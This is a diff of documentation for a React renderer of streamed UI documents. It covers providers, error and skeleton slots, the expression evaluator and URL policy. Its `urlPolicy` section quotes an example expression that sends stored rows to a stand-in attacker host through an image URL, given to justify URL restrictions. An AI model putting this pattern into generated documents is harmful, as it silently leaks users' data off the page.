@@ -3,7 +3,7 @@
 `<RendererProvider>` holds your [implementations](/react), the evaluator with
 your [host functions](/expr/functions), the fallback UI and one reactive store.
 `<EntriesRenderer>` renders [entries](/entry) against that store and re-renders
-as state changes. In a server pass it does the same on the server; see
+as state changes. It also renders on the server: see
 [Server rendering](/react/ssr).
 
 ## Mounting a document
@@ -47,7 +47,7 @@ The renderers under one provider form a **group** and share one `root` scope:
   "props": { "expr": "({ label: 'Orders', value: scopes.root.orderCount })" } }
 ```
 
-The Stat shows `1`, not `0`: [`seed`](/entry#seed) is first-writer-wins, so the
+The Stat shows `1{:ts}`, not `0{:ts}`: [`seed`](/entry#seed) is first-writer-wins, so the
 second seed keeps what the first wrote.
 
 The [Streamdown plugin](/streamdown) relies on this: each ```` ```uicast ````
@@ -75,11 +75,7 @@ To isolate documents, give each its own provider.
 
 `<EntriesRenderer>` takes one prop, `entries`, memoized on the array reference,
 so each streamed entry must arrive in a new array:
-
-```tsx
-setEntries((prev) => [...prev, next]); // ✅ new reference — the line mounts
-entries.push(next); //                    ❌ same reference — nothing renders
-```
+`setEntries((prev) => [...prev, next]){:ts}`
 
 Settled subtrees do not re-render as later entries arrive. `<EntriesRenderer>`
 throws outside a `<RendererProvider>`.
@@ -99,7 +95,7 @@ const evaluator = new Evaluator({ functions: [listRows, deleteRow] }); // ✅ mo
 
 ### Host functions — only in `seed` and `callbacks`
 
-A host function is a bare identifier in an expression, called as `name(input)`,
+A host function is a bare identifier in an expression, called as `name(input){:ts}`,
 and only in [`seed`](/entry#seed) and [`callbacks`](/entry#callbacks):
 
 ```jsonc
@@ -125,7 +121,7 @@ there is refused, and the element shows its error slot (`guardrail-violation`):
 
 | Slot | Rendered when | Default |
 |---|---|---|
-| `defaultSkeleton` | where an implementation has no `skeleton`: in the slot of a child that has not streamed in; while an async [`seed`](/entry#seed) or `init` loads, and in [`DocumentSkeleton`](/react/ssr#document-skeleton), for an element with no children | nothing |
+| `defaultSkeleton` | an implementation has no `skeleton`. It fills the slot of a child that has not streamed in. While an async [`seed`](/entry#seed) or `init` loads, and in [`DocumentSkeleton`](/react/ssr#document-skeleton), it stands in for an element without `children`; an element with children shows only its children. | nothing |
 | `confirm` | a callback step has `confirm:` | `window.confirm` |
 | `error` | any element-level failure: an implementation throws, an expression fails, an entry is misused as a list, or its `component` has no implementation | a plain inline-styled `div` |
 
@@ -159,7 +155,7 @@ type SkeletonComponentProps = {
   //       └─ the entry has not streamed in yet
   entry: ComponentEntry; // the element's own, or the parent's in a child's slot; nothing in it is evaluated
   knownProps?: Record<string, unknown>; // the props that need no evaluation (a literal or none), parsed and checked; absent in a child's slot
-  children?: ReactNode; // present when the skeleton draws the element itself: render your own tag around them
+  children?: ReactNode; // the children's skeletons, to wrap in your own tag; null without children, absent in a child's slot
 };
 
 type ConfirmComponentProps = {
@@ -170,24 +166,27 @@ type ConfirmComponentProps = {
 };
 
 type ErrorComponentProps = {
-  error: EntryError;      // classified: switch on `error.reason` / `error.fault`
-  elementKey?: string;    // set when the failure is tied to a specific entry
+  error: EntryError; // classified: switch on `error.reason` / `error.fault`; `error.elementKey` is the element's key
 };
 ```
 
 Every failure, an unknown component included, is an
-[`EntryError`](/error-recovery#classification-entryerror-and-onerror) to branch
-on:
+[`EntryError`](/error-recovery#classification-entryerror-and-onerror). Your own
+`RenderError` can branch on it:
 
 ```tsx
-const ErrorSlot = ({ error, elementKey }: ErrorComponentProps) => {
+const RenderError = ({ error }: ErrorComponentProps) => {
   if (error.reason === "unknown-component")
-    return <div>No implementation for “{elementKey}”</div>;
+    return <div>No implementation for “{error.elementKey}”</div>;
   // a "document" fault is the model's to fix; an "environment" fault is yours
   if (error.fault === "document")
-    return <button onClick={() => regenerate(elementKey)}>Regenerate</button>;
+    return <button onClick={() => regenerate(error.elementKey)}>Regenerate</button>;
   return <div>Something broke here: {error.message}</div>;
 };
+
+<RendererProvider evaluator={evaluator} implementations={impls} fallbackComponents={{ error: RenderError }}>
+  <EntriesRenderer entries={entries} />
+</RendererProvider>;
 ```
 
 `regenerate` is yours; see [Error recovery](/error-recovery).
@@ -226,8 +225,8 @@ const evaluator = new Evaluator({
 ```
 
 `Evaluator` checks every read and call at run time and needs no CSP
-`unsafe-eval`. A [custom evaluator](/expr/custom-expr) runs the same
-expressions with `new Function`, for documents from a trusted author only.
+`unsafe-eval`. To change how it checks or runs expressions, see
+[Custom evaluator](/expr/custom-expr).
 
 The prop is typed `ExpressionEvaluator` (exported by `@uicast/expr` and
 `@uicast/core`); an evaluator for another language, with its own prompt, can
@@ -237,14 +236,14 @@ implement it.
 
 An expression may be at most `maxSourceLength` characters (1000 by default);
 a longer one is rejected before parsing. Pass the same value to
-`getExpressionsPartialPrompt({ maxLength })`.
+`getExpressionsPartialPrompt({ maxLength }){:ts}`.
 
 ### `urlPolicy` — the URLs a document may load
 
-`urlPolicy` checks every prop the definition declares as a URL (`z.url()`),
+`urlPolicy` checks every prop the definition declares as a URL (`z.url(){:ts}`),
 after props parse and before the implementation sees them. The
 [evaluator](/expr) allows
-`"https://evil.tld/?d=" + JSON.stringify(scopes.root.rows)`, a valid
+`"https://evil.tld/?d=" + JSON.stringify(scopes.root.rows){:ts}`, a valid
 expression, and `<img src>` fetches it on render, with no click.
 
 By default only relative URLs, same-origin absolute URLs, raster `data:` images
@@ -266,13 +265,23 @@ To allow more, pass an object or a predicate:
 
 | Field | Default | |
 | --- | --- | --- |
-| `allowRelative` | `true` | `/a`, `a/b`, `?q=1`, `#x`; `//host/a` and `\\host/a` count as absolute |
-| `allowSameOrigin` | `true` | Absolute URLs on the page origin |
-| `hosts` | `[]` | Extra hosts over http/https; `*.example.com` matches subdomains only |
-| `allowDataImages` | `true` | `data:` raster images; never `image/svg+xml` |
+| `allowRelative` | `true{:ts}` | `/a`, `a/b`, `?q=1`, `#x`; `//host/a` and `\\host/a` count as absolute |
+| `allowSameOrigin` | `true{:ts}` | Absolute URLs on the page origin |
+| `hosts` | `[]{:ts}` | Extra hosts over http/https; `*.example.com` matches subdomains only |
+| `allowDataImages` | `true{:ts}` | `data:` raster images; never `image/svg+xml` |
 | `origin` | `location.origin` | Set it where there is no `location` (SSR) |
 
-A predicate, `urlPolicy={(url) => boolean}`, replaces these rules.
+A predicate, `urlPolicy={(url) => boolean}{:tsx}`, replaces these rules.
+
+Pass the same policy to the prompt, so the model writes URLs the renderer
+loads. Its `# URL Props` section lists them:
+
+```ts
+getComponentsPartialPrompt({ definitions, urlPolicy: { hosts: ["cdn.example.com", "*.imgix.net"] } });
+```
+
+Without `urlPolicy`, the section describes the defaults, as the renderer uses
+them. A predicate prints nothing: describe it in `note`.
 
 ### `init` — preload state for the group
 
@@ -283,9 +292,7 @@ evaluate:
 import type { InitFn } from "@uicast/react";
 
 const init: InitFn = async ({ scopes }) => {
-  // assigning a field emits, exactly like `$$set`; a nested assignment
-  // (`scopes.root.user.name = …`) is a plain write nobody hears
-  (scopes.root as Record<string, unknown>).user = await fetchUser();
+  scopes.root.user = await fetchUser();
 };
 
 <RendererProvider evaluator={evaluator} implementations={implementations} init={init}>
@@ -323,7 +330,7 @@ An entry reads it like `root`:
   "props": { "expr": "({ text: 'Hi ' + scopes.userCtx.name })" } }
 ```
 
-Host code can write to the handle at any time (`userCtx.plan = "free"`), and
+Host code can write to the handle at any time (`userCtx.plan = "free"{:ts}`), and
 every document reading it re-renders.
 
 **Tell the model about it**: no prompt builder knows the scope. Describe it in
@@ -343,3 +350,4 @@ Nothing checks that the note matches the scope; keep them in sync.
 - [Component implementation](/react) — the `implementations` you pass in.
 - [Entry fields](/entry) — the `entries` the renderer mounts.
 - [The expression evaluator](/expr) — what runs inside an entry.
+
